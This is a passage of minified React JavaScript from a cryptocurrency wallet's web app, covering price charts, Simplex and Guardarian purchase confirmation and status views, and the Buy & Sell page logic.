            o.options.tooltips.callbacks.title = e => {
                let[t] = e;
                return date_format(1e3 * t.xLabel, "dd mmm HH:00")
            }
            ;
            o.options.tooltips.callbacks.label = e => `${(0,
            Ko.yF)(e.yLabel) || ""} ${n ? n.toUpperCase() : s.toUpperCase()}`;
            o.options.scales.yAxes[0].ticks.min = Math.floor(.85 * u);
            const d = Math.round(c.length / 12);
            o.options.scales.xAxes[0].ticks.callback = i ? e => i(e) : (e, t) => t % d != 0 ? null : date_format(1e3 * e, r || l);
            return o
        }
          , v4 = getChartConfig
          , useThemeColor = e => {
            let {theme: t, config: a, chart: n} = e;
            (0,
            O.useEffect)(( () => {
                if (a && n) {
                    if ("dark" === t) {
                        a.options.scales.xAxes[0].ticks.fontColor = "#656565";
                        a.options.scales.yAxes[0].ticks.fontColor = "#656565";
                        a.options.scales.yAxes[0].gridLines.color = "#656565"
                    } else if ("light" === t) {
                        a.options.scales.xAxes[0].ticks.fontColor = "rgb(196,196,196)";
                        a.options.scales.yAxes[0].ticks.fontColor = "rgb(196,196,196)";
                        a.options.scales.yAxes[0].gridLines.color = "#f1f1f1"
                    }
                    n.update(a)
                }
            }
            ), [t])
        }
          , _4 = useThemeColor
          , w4 = undefined
          , use_change_rate = e => {
            let {data: t} = e;
            const a = null == t ? void 0 : t.length;
            if (!a)
                return;
            const n = t[a - 1].y;
            let r, l = 0;
            for (; !r && (0,
            Ko.lt)(l, a); ) {
                r = t[l].y;
                l += 1
            }
            const s = Number((n - r) / r * 100).toFixed(2);
            return Number.isNaN(s) || "NaN" === s ? "0" : s
        }
          , b4 = ["luna"]
          , useBackgroundColor = e => {
            let {wallet: t, chartRef: a, currency: n} = e;
            const [r,l] = (0,
            O.useState)()
              , [s,i] = (0,
            O.useState)()
              , o = (0,
            O.useMemo)(( () => {
                let e = "#7190EB";
                n && -1 === b4.indexOf(n) && ga[n] && (e = ga[n]);
                return e
            }
            ), [n]);
            (0,
            O.useEffect)(( () => {
                var e;
                if (null == a || !a.current)
                    return;
                const t = null === (e = a.current.getContext("2d")) || void 0 === e ? void 0 : e.createLinearGradient(100, 0, 100, 200);
                if (t) {
                    t.addColorStop(0, o);
                    t.addColorStop(1, "rgba(255,255,255,0.0001)")
                }
                l(o);
                i(t)
            }
            ), [t]);
            return [r, s]
        }
          , k4 = useBackgroundColor
          , Charts = e => {
            var t, a;
            if (!e.wallet)
                return O.createElement(chart_Waiting, null);
            const {wallet: n, currency: r, family: l, smartContract: s, selectedFiat: i, canDrawChart: o} = (0,
            O.useMemo)(( () => {
                var t, a, n;
                return {
                    wallet: e.wallet,
                    currency: null === (t = e.wallet) || void 0 === t ? void 0 : t.currency,
                    family: null === (a = e.wallet) || void 0 === a ? void 0 : a.family,
                    smartContract: null === (n = e.wallet) || void 0 === n ? void 0 : n.smartContract,
                    selectedFiat: e.selectedFiat,
                    canDrawChart: e.canDrawChart
                }
            }
            ), [e.wallet, e.wallet.currency, e.wallet.family, e.wallet.smartContract, e.selectedFiat, e.canDrawChart])
              , [c,u] = useChart(f9)
              , [d,m] = (0,
            O.useState)(j9)
              , [p,f] = (0,
            O.useState)("mmm yyyy")
              , {convertToFiat: E} = useConverter()
              , {localCurrency: h} = local_currency_useLocalCurrency()
              , cbRules = e => date_format(1e3 * e, p)
              , g = E(1, n, i);
            (0,
            Cd.Y)(n);
            const y = "dd mmm"
              , [v,_] = y4({
                currency: r,
                family: l,
                smartContract: s,
                period: d,
                fiat: i,
                rate: g
            })
              , w = v4({
                config: f9,
                data: v,
                fiat: i,
                dateFormats: p,
                defaultDateFormats: y,
                localCurrency: h,
                cbRules
            })
              , b = (0,
            $.v9)(Ot)
              , k = use_change_rate({
                data: null == f9 || null === (t = f9.data) || void 0 === t || null === (a = t.datasets[0]) || void 0 === a ? void 0 : a.data
            });
            _4({
                theme: b,
                config: f9,
                chart: c
            });
            (0,
            O.useEffect)(( () => {
                w && c && c.update(w)
            }
            ), [w]);
            const [S,C] = k4({
                wallet: n,
                chartRef: u,
                currency: r
            });
            (0,
            O.useEffect)(( () => {
                f9.data.datasets[0].borderColor = S;
                f9.data.datasets[0].backgroundColor = C
            }
            ), [S, C]);
            const N = (0,
            O.useMemo)(( () => Boolean(null == w ? void 0 : w.data)), [null == w ? void 0 : w.data])
              , T = (0,
            O.useMemo)(( () => 2 === _ && o), [_, o])
              , A = (0,
            O.useMemo)(( () => !o || 3 === _ || 1 === _ && !N && null != c), [o, _, N])
              , x = (0,
            O.useMemo)(( () => null != c), [c]);
            return O.createElement("div", null, O.createElement(chart_Waiting, {
                isVisible: T
            }), O.createElement(h4, {
                isVisible: A,
                theme: b
            }), O.createElement("div", {
                className: Ht()(E9, {
                    [v9]: x
                })
            }, O.createElement("div", {
                className: _9
            }, O.createElement(chart_Title, {
                currency: r,
                changeRate: k,
                selectedFiat: i,
                convertedToFiat: E(1, n, i),
                formattedCurrency: (0,
                be.xG)(r)
            }), O.createElement("canvas", {
                id: "charts-board",
                ref: u
            }), O.createElement(chart_Periods, {
                onPeriodSelect: e => {
                    let {dateFormats: t, period: a} = e;
                    f(t);
                    m(a)
                }
            }))))
        }
        ;
        Charts.propTypes = {
            wallet: as().object,
            selectedFiat: as().string,
            canDrawChart: as().bool
        };
        const S4 = Charts
          , GuardarianView = e => {
            var t, a, n, r, l, s, i;
            const {closePopup: o, paymentId: c} = e
              , u = (0,
            j.UO)()
              , [d,m] = (0,
            O.useState)(!0)
              , [p,f] = (0,
            O.useState)(null)
              , E = (0,
            j.k6)()
              , h = (0,
            $.v9)(au)
              , g = p ? h(p.payoutAddress, p.originalTransaction.toCurrency) : void 0
              , goBack = () => {
                E.push("/app/buy")
            }
            ;
            (0,
            O.useEffect)(( () => {
                async function fetch() {
                    try {
                        const e = await getGuardarianTransactionById(c || u.paymentId);
                        f(e);
                        m(!1)
                    } catch (e) {
                        console.warn(e)
                    }
                }
                fetch();
                const e = setInterval(fetch, 15e3);
                return () => clearInterval(e)
            }
            ), [c, u.paymentId]);
            const y = `https://payments.guardarian.com/checkout?tid=${null == p ? void 0 : p.originalTransaction.id}`
              , v = O.createElement("div", {
                className: V3
            }, O.createElement("div", {
                className: K3
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: B3()
                },
                className: H3
            })))
              , _ = O.createElement(O.Fragment, null, O.createElement("h3", {
                className: j3
            }, "Approved"), O.createElement("p", {
                className: $3
            }, "Payment request is processing ", O.createElement("b", null, " ~10-30 mins ")))
              , w = O.createElement("div", {
                className: q3
            }, null == p || null === (t = p.originalTransaction) || void 0 === t ? void 0 : t.toAmount, " ", (0,
            be.xG)(null !== (a = null == p || null === (n = p.originalTransaction) || void 0 === n ? void 0 : n.toCurrency) && void 0 !== a ? a : "undefined"), O.createElement("div", {
                className: X3
            }, null === (r = (0,
            be.UF)(null !== (l = null == p || null === (s = p.originalTransaction) || void 0 === s ? void 0 : s.fromCurrency) && void 0 !== l ? l : "undefined")) || void 0 === r ? void 0 : r.icon, " ", null == p || null === (i = p.originalTransaction) || void 0 === i ? void 0 : i.fromAmount))
              , b = O.createElement("div", {
                className: Q3
            }, "Payment ID", O.createElement("div", {
                className: J3
            }, "Check the detailed operation status here:"), O.createElement("div", {
                className: e9
            }, O.createElement("a", {
                href: y,
                target: "_blank",
                rel: "noopener noreferrer"
            }, formatAddress(null == p ? void 0 : p._id, 14)), O.createElement(button_copy, {
                text: y
            }, (e => e ? O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: d9()
                },
                className: a9
            }) : O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: p9()
                },
                className: t9
            })))))
              , k = O.createElement("div", {
                className: n9
            }, "You can check the transaction status in the history tab.")
              , S = O.createElement("div", {
                className: s9
            }, O.createElement(Yl, {
                className: l9,
                onClick: (0,
                M.d)() ? goBack : () => o(!1),
                id: "buySuccess"
            }, "Ok"))
              , C = O.createElement("div", {
                className: z3
            }, O.createElement(loader, {
                visible: d,
                width: 55
            }));
            return (0,
            M.d)() ? O.createElement("div", {
                className: O3
            }, O.createElement("div", {
                className: o9
            }, O.createElement("div", {
                className: D3
            }, O.createElement("div", {
                className: Z3
            }, v), _), O.createElement("div", {
                className: Y3
            }, d && C, !d && p && O.createElement(O.Fragment, null, w, b)), O.createElement("div", {
                className: r9
            }, S, k)), O.createElement("div", {
                className: i9
            }, O.createElement(S4, {
                wallet: g && g
            }))) : O.createElement("div", {
                className: O3
            }, O.createElement("div", null, O.createElement("div", {
                className: D3
            }, O.createElement("div", null, _), O.createElement("div", {
                className: Z3
            }, O.createElement("div", {
                className: Ht()(M3, U3)
            }), O.createElement("div", {
                className: Ht()(M3, G3)
            }), v)), O.createElement("div", {
                className: Y3
            }, d && C, !d && p && O.createElement(O.Fragment, null, w, b, k))), S)
        }
        ;
        var C4 = a(48764);
        const N4 = {
            wrapper: "confirm_wrapper_3VA33 app_wrapperBlock_2EpA3",
            wrapperForm: "confirm_wrapperForm_Y7YQA app_wrapperLeftBlock_3QLZp",
            headerTitles: "confirm_headerTitles_1Vq0m",
            backButton: "confirm_backButton_2Seqq",
            separator: "confirm_separator_M35eI",
            footerBlock: "confirm_footerBlock_La3R5",
            stepInfo: "confirm_stepInfo_1ILa1",
            error: "confirm_error_3RwFA",
            simplexIframe: "confirm_simplexIframe_3SVVc"
        }
          , SimplexConfirm = e => {
            let {paymentCreateTransaction: t, onBeforeConfirm: a, children: n} = e;
            const r = (0,
            $.I0)()
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)(null)
              , [d,m] = (0,
            O.useState)(!1)
              , p = O.createRef()
              , f = (0,
            j.k6)();
            (0,
            O.useEffect)(( () => {
                o(!1)
            }
            ), [t, a, n]);
            const handleElectron = () => {
                if (!p.current)
                    return;
                const e = document.querySelector("webview")
                  , t = new FormData(p.current)
                  , a = [];
                t.forEach(( (e, t) => {
                    a.push(`${t}=${e}`)
                }
                ));
                setTimeout((async () => {
                    await e.loadURL(c.paymentURL, {
                        postData: [{
                            type: "rawData",
                            bytes: C4.Buffer.from(a.join("&"))
                        }],
                        extraHeaders: "Content-Type: application/x-www-form-urlencoded"
                    });
                    e.addEventListener("close", ( () => {
                        var t;
                        e.src = "about:blank";
                        f.replace((0,
                        M.RU)(`/buy/simplex/view/${null == c || null === (t = c.details) || void 0 === t ? void 0 : t.payment_id}`))
                    }
                    ))
                }
                ), 500)
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (c && null != p && p.current) {
                    var e;
                    if (d)
                        return;
                    m(!0);
                    if ((0,
                    M.d)()) {
                        handleElectron();
                        return
                    }
                    null == p || null === (e = p.current) || void 0 === e || e.submit()
                }
            }
            ), [c, p]);
            const handleSubmit = async e => {
                var n;
                if (l)
                    return;
                const i = cc.$.txPerformanceStart();
                s(!0);
                o(!1);
                if (a) {
                    await a(e);
                    if (e.defaultPrevented) {
                        s(!1);
                        o(!0);
                        return
                    }
                }
                let c, d;
                try {
                    var m;
                    ({response: c, error: d} = await r(getUserBuyQuoteTransaction({
                        currencyFrom: null == t ? void 0 : t.currencyFrom,
                        currencyTo: null == t || null === (m = t.currencyTo) || void 0 === m ? void 0 : m.replace("-testnet", "").replace("ada-shelley", "ada"),
                        addressTo: null == t ? void 0 : t.payoutAddress,
                        amount: null == t ? void 0 : t.amount,
                        userAgent: navigator.userAgent,
                        networkTo: null == t ? void 0 : t.networkTo
                    })))
                } catch (e) {
                    d = e
                }
                if (d || null !== (n = c) && void 0 !== n && n.error) {
                    console.warn(d);
                    paymentError({
                        partner: "simplex",
                        paymentCreateTransaction: t,
                        error: d
                    });
                    o(!0);
                    s(!1);
                    return
                }
                paymentSuccess({
                    partner: "simplex",
                    paymentCreateTransaction: t
                });
                const p = cc.$.txPerformanceEnd(i);
                paymentPerformanceTx({
                    partner: "simplex",
                    paymentCreateTransaction: t,
                    txPerformance: p
                });
                u(c)
            }
            ;
            return O.createElement(O.Fragment, null, c && O.createElement(O.Fragment, null, O.createElement("webview", {
                src: c.paymentURL,
                id: "simplex_webview",
                name: "simplex_webview",
                className: N4.simplexIframe
            }), O.createElement("div", {
                className: N4.form
            }, O.createElement("form", {
                action: c.paymentURL,
                method: "POST",
                target: (0,
                M.d)() ? "simplex_webview" : "_self",
                ref: p
            }, O.createElement("input", {
                type: "hidden",
                name: "version",
                value: "1"
            }), O.createElement("input", {
                type: "hidden",
                name: "partner",
                value: "guarda"
            }), O.createElement("input", {
                type: "hidden",
                name: "payment_flow_type",
                value: "wallet"
            }), (0,
            M.d)() ? O.createElement("input", {
                type: "hidden",
                name: "return_url",
                value: `https://${document.location.host}/app/close`
            }) : O.createElement("input", {
                type: "hidden",
                name: "return_url",
                value: `https://${document.location.host}/app/buy/simplex/view/${c.details.payment_id}`
            }), O.createElement("input", {
                type: "hidden",
                name: "quote_id",
                value: c.details.quote_id
            }), O.createElement("input", {
                type: "hidden",
                name: "payment_id",
                value: c.details.payment_id
            }), O.createElement("input", {
                type: "hidden",
                name: "user_id",
                value: c.endUserId
            }), O.createElement("input", {
                type: "hidden",
                name: "destination_wallet[address]",
                value: c.details.destination_wallet.address
            }), O.createElement("input", {
                type: "hidden",
                name: "destination_wallet[currency]",
                value: c.details.destination_wallet.currency
            }), O.createElement("input", {
                type: "hidden",
                name: "fiat_total_amount[amount]",
                value: c.details.fiat_total_amount.amount
            }), O.createElement("input", {
                type: "hidden",
                name: "fiat_total_amount[currency]",
                value: c.details.fiat_total_amount.currency
            }), O.createElement("input", {
                type: "hidden",
                name: "digital_total_amount[amount]",
                value: c.details.requested_digital_amount.amount
            }), O.createElement("input", {
                type: "hidden",
                name: "digital_total_amount[currency]",
                value: c.details.requested_digital_amount.currency
            })))), n({
                isPartnerLoading: l,
                isPartnerError: i,
                handleSubmit
            }))
        }
          , SimplexView_SimplexView = e => {
            var t;
            const {closePopup: a, paymentId: n} = e
              , r = (0,
            j.UO)()
              , [l,s] = (0,
            O.useState)(!0)
              , [i,o] = (0,
            O.useState)(null)
              , c = (0,
            j.k6)()
              , u = (0,
            $.I0)()
              , goBack = () => {
                c.push("/app/buy")
            }
            ;
            (0,
            O.useEffect)(( () => {
                async function fetch() {
                    const e = await u(fetchTransactionById((null == r ? void 0 : r.paymentId) || n || ""));
                    null != e && e.tx && o(e.tx);
                    s(!1)
                }
                fetch();
                const e = setInterval(fetch, 15e3);
                return () => clearInterval(e)
            }
            ), []);
            const d = `https://payment-status.simplex.com/#/payment/${null == i ? void 0 : i.payment_id}`
              , m = O.createElement("div", {
                className: V3
            }, O.createElement("div", {
                className: K3
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: B3()
                },
                className: H3
            })))
              , p = O.createElement(O.Fragment, null, O.createElement("h3", {
                className: j3
            }, "Approved"), O.createElement("p", {
                className: $3
            }, "Payment request is processing ", O.createElement("b", null, " ~10-30 mins ")))
              , f = O.createElement("div", {
                className: q3
            }, i && i.requested_digital_amount.amount, " ", i && (0,
            be.xG)(i.requested_digital_amount.currency), O.createElement("div", {
                className: X3
            }, i && (null === (t = (0,
            be.UF)(i.fiat_total_amount.currency)) || void 0 === t ? void 0 : t.icon), " ", i && i.fiat_total_amount.amount))
              , E = O.createElement("div", {
                className: Q3
            }, "Payment ID", O.createElement("div", {
                className: J3
            }, "Check the detailed operation status here:"), O.createElement("div", {
                className: e9
            }, O.createElement("a", {
                href: d,
                target: "_blank",
                rel: "noopener noreferrer"
            }, formatAddress(null == i ? void 0 : i.payment_id, 14)), O.createElement(button_copy, {
                text: d
            }, (e => e ? O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: d9()
                },
                className: a9
            }) : O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: p9()
                },
                className: t9
            })))))
              , h = O.createElement("div", {
                className: n9
            }, "You will also receive emails from our partner Simplex with information about your purchase.")
              , g = O.createElement("div", {
                className: s9
            }, O.createElement(Yl, {
                className: l9,
                onClick: (0,
                M.d)() ? goBack : () => a(!1),
                id: "buySuccess"
            }, "Ok"))
              , y = O.createElement("div", {
                className: z3
            }, O.createElement(loader, {
                visible: l,
                width: 55
            }));
            return (0,
            M.d)() ? O.createElement("div", {
                className: O3
            }, O.createElement("div", {
                className: o9
            }, O.createElement("div", {
                className: D3
            }, O.createElement("div", {
                className: Z3
            }, m), p), O.createElement("div", {
                className: Y3
            }, l && y, !l && i && O.createElement(O.Fragment, null, f, E)), O.createElement("div", {
                className: r9
            }, g, h)), O.createElement("div", {
                className: i9
            }, O.createElement(S4, {
                wallet: i && (null == i ? void 0 : i.destination_wallet)
            }))) : O.createElement("div", {
                className: O3
            }, O.createElement("div", null, O.createElement("div", {
                className: D3
            }, O.createElement("div", null, p), O.createElement("div", {
                className: Z3
            }, O.createElement("div", {
                className: Ht()(M3, U3)
            }), O.createElement("div", {
                className: Ht()(M3, G3)
            }), m)), O.createElement("div", {
                className: Y3
            }, l && y, !l && i && O.createElement(O.Fragment, null, f, E, h))), g)
        }
        ;
        function FallbackConfirm(e) {
            let {children: t, onBeforeConfirm: a} = e;
            return t({
                handleSubmit: a
            })
        }
        FallbackConfirm.propTypes = {
            children: as().func.isRequired,
            onBeforeConfirm: as().func
        };
        function FallbackView() {
            return null
        }
        const T4 = {
            simplex: {
                BuyConfirm: SimplexConfirm,
                BuyView: SimplexView_SimplexView
            },
            guardarian: {
                BuyConfirm: GuardarianConfirm_GuardarianConfirm,
                BuyView: GuardarianView
            },
            __fallback__: {
                BuyConfirm: FallbackConfirm,
                BuyView: FallbackView
            }
        }
          , A4 = 200
          , x4 = 1e3
          , createNewWalletInSelector = async e => {
            let {wallet: t, setLoadingSelector: a, createNewCoinOrToken: n, parentWallet: r} = e
              , l = t;
            if (null != t && t.isFakeToken && r) {
                var s;
                const e = null == r || null === (s = r.subWallets) || void 0 === s ? void 0 : s.find((e => e.uuid === t.uuid));
                l = await n({
                    wallet: t,
                    isNewToken: !Boolean(e),
                    isNewWallet: !1,
                    parentWallet: r
                })
            } else if (!Boolean(t.address) && null != t && t.isFakeToken && (t.ticker || t.currency) !== t.family) {
                a(!0);
                const e = await n({
                    wallet: {
                        currency: t.family
                    },
                    isNewWallet: !0,
                    parentWallet: null
                });
                l = await n({
                    wallet: t,
                    isNewToken: !0,
                    isNewWallet: !1,
                    parentWallet: e
                });
                a(!1)
            } else if (!Boolean(t.address)) {
                a(!0);
                l = await n({
                    wallet: t,
                    isNewWallet: !0,
                    parentWallet: null
                });
                a(!1)
            }
            return l
        }
        ;
        let I4 = new AbortController
          , P4 = new AbortController;
        const BuySell_BuySell = () => {
            var e, t, a;
            const n = (0,
            $.I0)()
              , r = (0,
            j.k6)()
              , l = (0,
            $.v9)(wO)
              , s = (0,
            $.v9)(Ot)
              , i = (0,
            $.v9)(KO)
              , o = (null == i ? void 0 : i.limits) || null
              , c = (null == i ? void 0 : i.amountValidateObject) || null
              , {convertFiatToUSD: u} = fiat_converter()
              , d = useLocationSearch()
              , m = (0,
            $.v9)(TO)
              , p = (0,
            $.v9)(GO)
              , f = (0,
            $.v9)(IO)
              , E = (0,
            $.v9)($c)
              , {newTokens: h, newCoins: g} = hooks_use_wallets_to()
              , y = (0,
            $.v9)(qc)
              , v = (0,
            $.v9)(eu)
              , _ = (0,
            $.v9)(tu)
              , {createNewCoinOrToken: w} = useCreateWalletAndGoTo({
                noDownloadBackup: !0
            })
              , b = (0,
            $.v9)(FO)
              , [k,S] = (0,
            O.useState)(!1)
              , C = (0,
            $.v9)(LO)
              , N = (0,
            $.v9)(NO)
              , T = (0,
            $.v9)(HO)
              , A = (0,
            $.v9)(CO)
              , [x,I] = (0,
            O.useState)(!!d.paymentId)
              , P = O.createRef()
              , [L] = (0,
            O.useState)(navigator.onLine)
              , F = (0,
            $.v9)(bO)
              , W = (0,
            $.v9)(kO)
              , R = (0,
            $.v9)(SO)
              , B = (0,
            $.v9)(RO)
              , D = (0,
            $.v9)(OO)
              , U = !D
              , G = b || T
              , V = (0,
            $.v9)(DO)
              , K = null == V || null === (e = V[B]) || void 0 === e ? void 0 : e.estimate
              , H = (0,
            be.l2)(F)
              , [z,Z] = (0,
            O.useState)(!1)
              , [Y,q] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)((function initPage() {
                var e;
                null === (e = P4) || void 0 === e || e.abort();
                P4 = new AbortController;
                n(_O.fetchPartners({
                    abortController: P4,
                    force: !0
                }))
            }
            ), []);
            (0,
            O.useEffect)((function updatePaymentsWallets() {
                if (E && f.length > 0 && E.length !== f.length) {
                    var e;
                    null === (e = P4) || void 0 === e || e.abort();
                    P4 = new AbortController;
                    n(_O.fetchPartners({
                        abortController: P4,
                        force: !0
                    }))
                }
            }
            ), [E]);
            const setFiatWallet = e => {
                n(_O.changeFiatWallet({
                    fiatWallet: e,
                    abortController: P4
                }))
            }
              , changeSide = () => {
                var e, t, a;
                if (!0 === (null == _ ? void 0 : _.watchOnly))
                    return;
                const s = "#sell" === (null === (e = window) || void 0 === e || null === (t = e.location) || void 0 === t ? void 0 : t.hash) ? "buy" : "sell";
                let i;
                i = "sell" === s ? isSellFiatSupported(F) ? F : (0,
                Ho.t)(dS.H[0].ticker) : F;
                const o = objectToString({
                    fiat: i,
                    walletTo: null == _ ? void 0 : _.uuid
                });
                setFiatWallet(i);
                r.replace({
                    pathname: r.location.pathname,
                    search: o + "#" + l
                });
                null === (a = P4) || void 0 === a || a.abort();
                P4 = new AbortController;
                window.location.hash = s;
                n(_O.changeSide(s));
                n(_O.setOptimalPurchase(null));
                n(_O.fetchPartners({
                    force: !0,
                    abortController: P4
                }))
            }
              , changePartner = e => {
                var t;
                n(_O.changePartner(e));
                const a = null == V || null === (t = V[e]) || void 0 === t ? void 0 : t.estimate;
                "buy" === l && a && n(_O.changeCryptoAmount(a));
                "sell" === l && a && n(_O.changeFiatAmount(a))
            }
              , handleBeforeConfirm = async e => {
                var t, a, n;
                const {isValid: s} = null !== (t = null === (a = P.current) || void 0 === a ? void 0 : a.validate()) && void 0 !== t ? t : {};
                if (!s) {
                    S(!0);
                    e.preventDefault();
                    return
                }
                const i = objectToString({
                    estimate: K,
                    amount: (0,
                    Ko.y4)("buy" === l ? R : W),
                    fiat: F,
                    walletTo: null == _ ? void 0 : _.uuid,
                    addressTo: null !== (n = null == _ ? void 0 : _.accountName) && void 0 !== n ? n : null == _ ? void 0 : _.address,
                    currencyTo: null == _ ? void 0 : _.currency
                });
                r.replace({
                    pathname: r.location.pathname,
                    search: i + "#" + l
                })
            }
              , X = "buy" === l ? "BuyNext" : "SellNext"
              , handleChangeAmount = e => {
                var t;
                null === (t = I4) || void 0 === t || t.abort();
                n(_O.fetchPartnersIsLoading(!0));
                const a = e.replace(/[^0-9.,]/g, "");
                "buy" === l && n(_O.changeFiatAmount(a));
                "sell" === l && n(_O.changeCryptoAmount(a));
                const r = setTimeout(( () => {
                    I4 = new AbortController;
                    n(_O.setAmountPaymentCreateTransaction(Number(a)));
                    n(_O.errorCheck({
                        abortController: I4
                    }))
                }
                ), 400);
                return () => {
                    clearTimeout(r)
                }
            }
              , setCryptoWallet = async e => {
                const t = v(e.parentUuid)
                  , a = await createNewWalletInSelector({
                    wallet: e,
                    setLoadingSelector: q,
                    createNewCoinOrToken: w,
                    parentWallet: t
                });
                n(_O.changeCryptoWallet({
                    cryptoWallet: a,
                    abortController: I4
                }))
            }
              , {BuyConfirm: Q, BuyView: J} = T4[B || "__fallback__"]
              , ee = O.createElement(fiat_list_FiatList, {
                setVisibleErrors: S,
                selected: F,
                onChange: setFiatWallet,
                side: l
            })
              , te = O.createElement(Mh, {
                inputWrapperClassName: w2,
                customWrapperList: Ht()(s2, z2.walletsWrapper),
                isSelectorWithValue: !0,
                onChange: setCryptoWallet,
                selectedWallet: null != _ ? _ : void 0,
                wallets: "buy" === l ? f : y,
                updateBalanceOnChange: !0,
                isNewSelector: !0,
                currenciesToBuy: !0,
                notSortByCmc: !0,
                newArrow: !0,
                noTicker: !0,
                newTokens: "buy" === l ? h : [],
                newCoins: "buy" === l ? g : [],
                isLoading: Y
            })
              , ae = "buy" === l ? te : ee
              , ne = "buy" === l ? ee : te
              , re = !G && (C || U && !k)
              , le = (0,
            O.useMemo)(( () => {
                var e, t, a, n;
                return [...null != V && null !== (e = V.simplex) && void 0 !== e && e.estimate ? [{
                    estimate: null == V || null === (t = V.simplex) || void 0 === t ? void 0 : t.estimate,
                    Component: () => {
                        var e;
                        return O.createElement(ChooseSimplex, {
                            side: l,
                            currencyTo: null == A || null === (e = A.currencyTo) || void 0 === e ? void 0 : e.toUpperCase(),
                            willReceive: V.simplex.estimate || void 0,
                            choosenPartner: B,
                            changePartner,
                            partner: null == D ? void 0 : D.partner
                        })
                    }
                }] : [], ...null != V && null !== (a = V.guardarian) && void 0 !== a && a.estimate ? [{
                    estimate: null == V || null === (n = V.guardarian) || void 0 === n ? void 0 : n.estimate,
                    Component: () => {
                        var e, t;
                        return O.createElement(ChooseGuardarian, {
                            side: l,
                            currencyTo: null == A || null === (e = A.currencyTo) || void 0 === e ? void 0 : e.toUpperCase(),
                            willReceive: (null == V || null === (t = V.guardarian) || void 0 === t ? void 0 : t.estimate) || void 0,
                            partner: null == D ? void 0 : D.partner,
                            changePartner,
                            choosenPartner: B
                        })
                    }
                }] : []].sort(( (e, t) => {
                    const a = Number(e.estimate)
                      , n = Number(t.estimate);
                    return a < n ? 1 : a > n ? -1 : 0
                }
                ))
            }
            ), [null == V || null === (t = V.guardarian) || void 0 === t ? void 0 : t.estimate, null == V || null === (a = V.simplex) || void 0 === a ? void 0 : a.estimate, B, null == D ? void 0 : D.partner]);
            return O.createElement("div", {
                className: z2.wrapper
            }, O.createElement("div", {
                className: "container"
            }, O.createElement("div", {
                className: Ht()("row", z2.displayFlex)
            }, O.createElement("div", {
                className: z2.wrapperMainPage
            }, O.createElement("div", {
                className: z2.leftBlock
            }, O.createElement("div", {
                className: z2.wrapperForm
            }, O.createElement("h1", {
                className: z2.leftBlockTitle
            }, "Buy & Sell"), O.createElement(_m, {
                isNewDesign: !0,
                currency: null == _ ? void 0 : _.currency,
                wallet: _,
                type: Zd,
                className: z2.message,
                top: 144
            }), O.createElement(_m, {
                isNewDesign: !0,
                currency: null == _ ? void 0 : _.currency,
                wallet: _,
                type: Yd,
                className: z2.message,
                top: 144
            }), !G && 0 === f.length && !K && !U && (null == p ? void 0 : p.length) > 0 && O.createElement(ui_message, {
                className: Ht()(z2.message, z2.messageInfo, z2.emptyBackupMessage),
                type: "info"
            }, "You need", " ", p.filter((e => "btc-testnet" !== e)).map((e => null == e ? void 0 : e.toUpperCase())).join(", "), " ", "wallet to proceed."), O.createElement(Q, {
                paymentCreateTransaction: A,
                onBeforeConfirm: handleBeforeConfirm
            }, (e => {
                var t, a, n, r;
                let {isPartnerLoading: i, isPartnerError: u, handleSubmit: d} = e;
                return O.createElement(sf(), {
                    ref: P
                }, O.createElement(lf.ValidatorField, {
                    value: {
                        amount: (0,
                        Ko.y4)("buy" === l ? R : W)
                    },
                    rules: zf.amountAndBalance({
                        balance: "buy" === l ? 1 / 0 : null == _ ? void 0 : _.balance,
                        amountValidateObject: c,
                        amount: "buy" === l ? R : W
                    })
                }, (e => {
                    var t;
                    let {isValid: a, message: n} = e;
                    const r = Boolean(!a || N);
                    return O.createElement(pa, {
                        isNewDesign: !0,
                        message: n,
                        isInvalid: r && !G,
                        className: y2,
                        withOverflow: !0,
                        top: -24,
                        right: "dark" === s ? 34 : 32,
                        handleChangeAmount,
                        minValue: String(null == c ? void 0 : c.min),
                        maxValue: String(null == c ? void 0 : c.max)
                    }, O.createElement(InputValueAndSelect_InputValueAndSelect, {
                        isInvalid: r && !G,
                        title: "Amount",
                        noWidth: !0,
                        customWrapper: Ht()(r2),
                        customWrapperCurrencies: U1,
                        isSelectorWithValue: !0,
                        fiat: "buy" === l ? F : null == _ ? void 0 : _.currency,
                        value: "buy" === l ? R : W,
                        onChange: handleChangeAmount,
                        onEnter: d
                    }, ne, !(0,
                    Ko.gt)(m, "buy" === l ? R : W) || re || r ? null : O.createElement("span", {
                        className: z2.amountNotify
                    }, "Optimal rate starts from ", O.createElement("span", {
                        id: "buyOptimalRate",
                        className: z2.amountNotifyLink,
                        onClick: () => handleChangeAmount(m || "-")
                    }, (0,
                    Ko.yF)(m), " ", "buy" === l ? null == F ? void 0 : F.toUpperCase() : null == _ || null === (t = _.currency) || void 0 === t ? void 0 : t.toUpperCase()))))
                }
                )), O.createElement("div", {
                    className: z2.changeSideWrapper
                }, O.createElement("img", {
                    className: z2.changeSideIcon,
                    onClick: changeSide,
                    src: E3,
                    alt: "Change Buy or Sell"
                })), O.createElement(lf.ValidatorField, {
                    value: _,
                    rules: zf.wallet
                }, (e => {
                    let {isValid: t, message: a} = e;
                    return O.createElement(pa, {
                        isNewDesign: !0,
                        message: a,
                        isInvalid: Boolean(!C && !t && k),
                        className: Ht()(z2.errorInput, "dark" === s ? z2.inputDark : ""),
                        withOverflow: !0,
                        top: -55,
                        right: 24,
                        isSelect: !0
                    }, O.createElement(InputValueAndSelect_InputValueAndSelect, {
                        title: "I want",
                        noWidth: (0,
                        M.p1)(),
                        disabled: !0,
                        customWrapper: Ht()(r2),
                        customWrapperCurrencies: U1,
                        isSelectorWithValue: !0,
                        fiat: "buy" === l ? null == _ ? void 0 : _.currency : F,
                        value: N ? "-" : "buy" === l ? W : R,
                        isLoading: Boolean((!(C || null != f && f.length && !G) || "buy" === l) && Y)
                    }, O.createElement("div", {
                        className: z2.toWalletInput
                    }, ae)))
                }
                )), O.createElement("div", null), O.createElement("div", {
                    className: z2.choosePartnerWrapper
                }, O.createElement("div", {
                    className: z2.choosePartnerHeader
